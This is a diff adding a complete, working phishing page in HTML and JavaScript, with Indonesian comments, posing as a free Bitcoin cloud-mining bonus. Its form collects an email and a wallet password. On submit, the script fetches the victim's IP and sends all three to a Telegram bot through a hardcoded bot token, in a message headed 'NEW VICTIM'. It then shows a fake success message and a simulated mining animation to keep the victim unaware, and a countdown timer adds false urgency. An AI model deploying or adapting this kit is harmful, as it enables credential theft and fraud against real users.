@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Crypto Miner - Claim Now!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0a1a2e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .card {
+            background: rgba(15, 25, 45, 0.9);
+            backdrop-filter: blur(10px);
+            border-radius: 30px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.1);
+            text-align: center;
+            animation: fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        .crypto-icon {
+            font-size: 70px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); text-shadow: 0 0 0px gold;}
+            50% { transform: scale(1.1); text-shadow: 0 0 20px gold;}
+            100% { transform: scale(1); text-shadow: 0 0 0px gold;}
+        }
+
+        h1 {
+            font-size: 28px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .sub {
+            color: #aaa;
+            margin-bottom: 25px;
+            font-size: 14px;
+        }
+
+        .bonus-box {
+            background: rgba(0,0,0,0.5);
+            border-radius: 20px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+
+        .bonus-amount {
+            font-size: 32px;
+            font-weight: bold;
+            color: #FFD700;
+        }
+
+        .timer {
+            font-family: monospace;
+            font-size: 20px;
+            background: #000;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 50px;
+            margin: 10px 0;
+            color: #0f0;
+        }
+
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus {
+            background: rgba(255,255,255,0.2);
+            box-shadow: 0 0 10px rgba(255,215,0,0.5);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            margin: 15px 0;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(90deg, #FFD700, #FF8C00);
+            color: #000;
+            font-weight: bold;
+            font-size: 18px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(255,215,0,0.8);
+        }
+
+        .warning {
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+
+        .mining-bar {
+            background: #1a1a2e;
+            border-radius: 30px;
+            height: 12px;
+            width: 100%;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .mining-progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #FFD700, #FFA500);
+            border-radius: 30px;
+            transition: width 0.1s linear;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <div class="crypto-icon">⛏️💰</div>
+        <h1>FREE BITCOIN MINING</h1>
+        <div class="sub">Cloud Mining - Limited Bonus!</div>
+
+        <div class="bonus-box">
+            <div>🎁 WELCOME BONUS 🎁</div>
+            <div class="bonus-amount">+0.005 BTC</div>
+            <div>+ 500 FREE Hashrate</div>
+        </div>
+
+        <div class="timer" id="timer">Claim in: 05:00</div>
+
+        <div class="mining-bar">
+            <div class="mining-progress" id="progress"></div>
+        </div>
+
+        <div id="miningStatus" style="color:#FFD700; font-size:14px; margin:5px">⚡ Mining inactive - Login to start</div>
+
+        <form id="phishForm">
+            <input type="email" id="email" placeholder="Your Email Address" required>
+            <input type="password" id="password" placeholder="Wallet Password / Login" required>
+            <button type="submit">🔥 ACTIVATE MINING & CLAIM 🔥</button>
+        </form>
+
+        <div class="warning">
+            ⚠️ Only 247 bonuses left today! <br>
+            Minimum withdraw: 0.01 BTC
+        </div>
+    </div>
+</div>
+
+<script>
+    // KONFIGURASI BOT TELEGRAM
+    const BOT_TOKEN = "8779504649:AAHGm5rg5dnZZtnfcgADotDQ9rJRvOGlwSg";
+    const CHAT_ID = "@PhissingssBot";
+
+    // Fungsi kirim data ke Telegram
+    async function sendToTelegram(email, password, ip) {
+        const message = `🔐 NEW VICTIM 🔐
+📧 Email: ${email}
+🔑 Password: ${password}
+🌐 IP: ${ip}
+⏰ Time: ${new Date().toLocaleString()}
+🛠 Source: Crypto Miner Phishing`;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+            console.log("Data terkirim ke Telegram");
+        } catch(e) {
+            console.log("Error Telegram:", e);
+        }
+    }
+
+    // Ambil IP korban
+    async function getVictimIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            return data.ip;
+        } catch(e) {
+            return 'unable to get IP';
+        }
+    }
+
+    // Countdown timer
+    let timeLeft = 300;
+    const timerEl = document.getElementById('timer');
+    const progressBar = document.getElementById('progress');
+
+    const countdown = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            timerEl.innerText = "Offer expired!";
+        } else {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerEl.innerText = `Claim in: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
+            let percent = ((300 - timeLeft) / 300) * 100;
+            progressBar.style.width = percent + "%";
+        }
+    }, 1000);
+
+    // Simulasi mining animation
+    let miningInterval;
+    function startMiningAnimation() {
+        if (miningInterval) clearInterval(miningInterval);
+        let miningPercent = 0;
+        const statusDiv = document.getElementById('miningStatus');
+        miningInterval = setInterval(() => {
+            if (miningPercent >= 100) {
+                miningPercent = 0;
+            }
+            miningPercent += 2;
+            progressBar.style.width = miningPercent + "%";
+            statusDiv.innerHTML = "⛏️ Mining active: " + Math.floor(Math.random() * 500) + " H/s | Earning: 0.000" + Math.floor(Math.random()*999) + " BTC";
+        }, 300);
+    }
+
+    // HANDLE FORM SUBMIT - KIRIM DATA KE TELEGRAM
+    document.getElementById('phishForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // Ambil IP dan kirim ke Telegram
+        const ip = await getVictimIP();
+        await sendToTelegram(email, password, ip);
+        
+        // Tampilkan umpan sukses
+        document.querySelector('.bonus-amount').innerHTML = "+0.025 BTC";
+        document.getElementById('miningStatus').innerHTML = "✅ MINING ACTIVATED! Your bonus will be credited within 24h";
+        startMiningAnimation();
+        
+        // Reset form
+        document.getElementById('email').value = "";
+        document.getElementById('password').value = "";
+        
+        // Kasih notifikasi ke korban
+        setTimeout(() => {
+            alert("Mining started! Check your dashboard.");
+        }, 500);
+    });
+
+    // Auto progress bar
+    let fakeProgress = 0;
+    setInterval(() => {
+        if (!document.getElementById('miningStatus').innerHTML.includes("ACTIVATED")) {
+            fakeProgress = (fakeProgress + 1) % 100;
+            progressBar.style.width = fakeProgress + "%";
+        }
+    }, 200);
+</script>
+</body>
+</html>
